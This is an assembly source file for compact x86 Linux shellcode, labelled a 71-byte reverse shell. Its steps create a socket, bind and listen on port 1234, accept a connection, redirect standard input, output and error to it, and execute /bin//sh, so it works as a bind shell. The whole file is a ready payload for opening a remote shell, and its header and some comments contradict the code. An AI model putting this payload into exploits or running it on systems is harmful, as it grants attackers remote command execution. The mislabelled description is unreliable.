;
;  Copyright © 2017 Odzhan. All Rights Reserved.
;
;  Redistribution and use in source and binary forms, with or without
;  modification, are permitted provided that the following conditions are
;  met:
;
;  1. Redistributions of source code must retain the above copyright
;  notice, this list of conditions and the following disclaimer.
;
;  2. Redistributions in binary form must reproduce the above copyright
;  notice, this list of conditions and the following disclaimer in the
;  documentation and/or other materials provided with the distribution.
;
;  3. The name of the author may not be used to endorse or promote products
;  derived from this software without specific prior written permission.
;
;  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
;  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
;  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
;  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
;  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
;  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
;  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
;  POSSIBILITY OF SUCH DAMAGE.
;    

; 71 byte reverse shell for linux/x86
; odzhan

    bits 32

    ; setup sock_addr
    xor    ebx, ebx          ; ebx=0
    mul    ebx               ; eax=0, edx=0
    ; step 1, create a socket
    ; socket (AF_INET, SOCK_STREAM, IPPROTO_IP)
    mov    al, 0x66          ; eax = sys_socketcall
    inc    ebx               ; ebx = sys_socket
    push   edx               ; args.protocol = IPPROTO_IP
    push   ebx               ; args.type     = SOCK_STREAM
    push   2                 ; args.family   = AF_INET
    mov    ecx, esp          ; ecx=&args
    int    0x80
    
    xchg   eax, edi
    
    ; step 2, bind to port 1234
    ; bind (s, &sa, sizeof(sa))
    pop    ebx               ; ebx=2, sys_bind
    pop    esi               ; esi=1
    push   0x10              ; sizeof(sa)
    push   ebp               ; &sa
    push   edi               ; s
    mov    al, 0x66          ; eax=sys_socketcall
    mov    ecx, esp          ; ecx=&args
    int    0x80
    
    mov    [ecx+4], edx      ; clear sa from args
    
    ; step 3, listen for incoming connections
    ; listen (s, 0);
    mov    al, 0x66          ; eax=sys_socketcall
    mov    bl, 4             ; ebx=sys_listen
    int    0x80
    
    ; step 4, accept connections
    ; accept (s, 0, 0);
    mov    al, 0x66          ; eax=sys_socketcall
    inc    ebx               ; ebx=sys_accept
    int    0x80
    
    ; step 5, assign socket to stdin, stdout and stderr
    ; dup2(s, FILENO_STDIN); 
    ; dup2(s, FILENO_STDOUT); 
    ; dup2(s, FILENO_STDERR); 
    push   3
    pop    ecx               ; ecx=2
    xchg   ebx, eax          ; ebx=s
dup_loop:
    push   0x3f
    pop    eax               ; eax=sys_dup2
    dec    ecx
    int    0x80
    jnz    dup_loop
    
    ; step 6, execute /bin//sh
    mov    al, 0xb           ; eax=sys_execve
    push   ecx
    push   '//sh'            ; 
    push   '/bin'            ; 
    mov    ebx, esp          ; ebx="/bin//sh", 0
    int    0x80              ; exec sys_execve
